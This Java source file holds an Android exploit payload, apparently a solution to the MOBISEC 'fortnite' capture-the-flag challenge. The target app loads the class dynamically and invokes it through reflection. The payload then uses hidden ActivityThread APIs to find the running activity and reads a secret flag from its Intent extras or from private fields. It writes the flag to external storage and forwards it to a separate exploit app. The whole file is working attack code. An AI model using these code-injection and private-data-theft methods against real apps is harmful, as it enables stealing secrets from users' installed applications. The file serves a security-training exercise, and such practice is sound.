package com.mobisec.fortnitepayload;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class Payload {

    private static final String TAG = "MOBISEC";

    // Must be static (target invokes it via reflection).
    public static void run() {
        try {
            Context ctx = currentApplication();
            if (ctx == null) {
                Log.e(TAG, "Payload: no Context available");
                return;
            }

            String flag = stealFlag(ctx);
            Log.e(TAG, "Payload got flag=" + flag);

            // Persist fallback
            writeToSdcard(flag);

            // Send it to our exploit app UI
            Intent i = new Intent();
            i.setClassName("com.mobisec.fortniteexploit", "com.mobisec.fortniteexploit.FlagActivity");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            i.putExtra("flag", flag);
            ctx.startActivity(i);

        } catch (Throwable t) {
            Log.e(TAG, "Payload exception: " + Log.getStackTraceString(t));
        }
    }

    private static Context currentApplication() throws Exception {
        Class<?> at = Class.forName("android.app.ActivityThread");
        Method m = at.getDeclaredMethod("currentApplication");
        Object app = m.invoke(null);
        return (Context) app;
    }

    /**
     * Robust flag steal:
     * 1) Grab current resumed MainActivity instance and read Intent extra "flag".
     * 2) Load MainActivity using the TARGET app's ClassLoader (ctx.getClassLoader()) and read field "flag".
     *    (This fixes ClassNotFoundException caused by DexClassLoader not seeing app classes.)
     */
    private static String stealFlag(Context ctx) throws Exception {
        // (1) Try Intent extra from currently resumed activity
        Activity a = getResumedActivity();
        if (a != null) {
            try {
                String f = a.getIntent() != null ? a.getIntent().getStringExtra("flag") : null;
                if (looksLikeFlag(f)) return f;
            } catch (Throwable ignored) { }
        }

        // (2) Try reflective field access using the app's PathClassLoader
        ClassLoader appCl = ctx.getClassLoader();
        Class<?> c = Class.forName("com.mobisec.fortnite.MainActivity", false, appCl);

        // 2a) Common case: static field named "flag"
        try {
            Field f = c.getDeclaredField("flag");
            f.setAccessible(true);
            Object v = f.get(null);
            String s = String.valueOf(v);
            if (looksLikeFlag(s)) return s;
        } catch (NoSuchFieldException ignored) { }

        // 2b) If it's an instance field, try read from live Activity instance
        if (a != null && c.isInstance(a)) {
            for (Field f : c.getDeclaredFields()) {
                if (f.getType() == String.class) {
                    f.setAccessible(true);
                    Object v = f.get(a);
                    String s = String.valueOf(v);
                    if (looksLikeFlag(s)) return s;
                }
            }
        }

        // 2c) As a last resort, scan static String fields for something that looks like a flag
        for (Field f : c.getDeclaredFields()) {
            if (f.getType() == String.class) {
                f.setAccessible(true);
                try {
                    Object v = f.get(null);
                    String s = String.valueOf(v);
                    if (looksLikeFlag(s)) return s;
                } catch (Throwable ignored) { }
            }
        }

        return "MOBISEC{FLAG_NOT_FOUND}";
    }

    private static boolean looksLikeFlag(String s) {
        return s != null && s.contains("MOBISEC{") && s.contains("}");
    }

    @SuppressWarnings("unchecked")
    private static Activity getResumedActivity() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method cur = at.getDeclaredMethod("currentActivityThread");
            cur.setAccessible(true);
            Object thread = cur.invoke(null);

            Field fActs = at.getDeclaredField("mActivities");
            fActs.setAccessible(true);
            Object actsObj = fActs.get(thread);
            if (!(actsObj instanceof Map)) return null;

            Map<Object, Object> acts = (Map<Object, Object>) actsObj;
            for (Object record : acts.values()) {
                try {
                    Class<?> rClz = record.getClass();
                    Field fPaused = rClz.getDeclaredField("paused");
                    fPaused.setAccessible(true);
                    boolean paused = (Boolean) fPaused.get(record);
                    if (paused) continue;

                    Field fAct = rClz.getDeclaredField("activity");
                    fAct.setAccessible(true);
                    Object act = fAct.get(record);
                    if (act instanceof Activity) return (Activity) act;
                } catch (Throwable ignored) { }
            }
        } catch (Throwable ignored) { }
        return null;
    }

    private static void writeToSdcard(String flag) {
        try {
            File out = new File(Environment.getExternalStorageDirectory(), "fortnite_flag.txt");
            FileOutputStream fos = new FileOutputStream(out, false);
            fos.write(flag.getBytes("UTF-8"));
            fos.close();
        } catch (Exception ignored) { }
    }
}
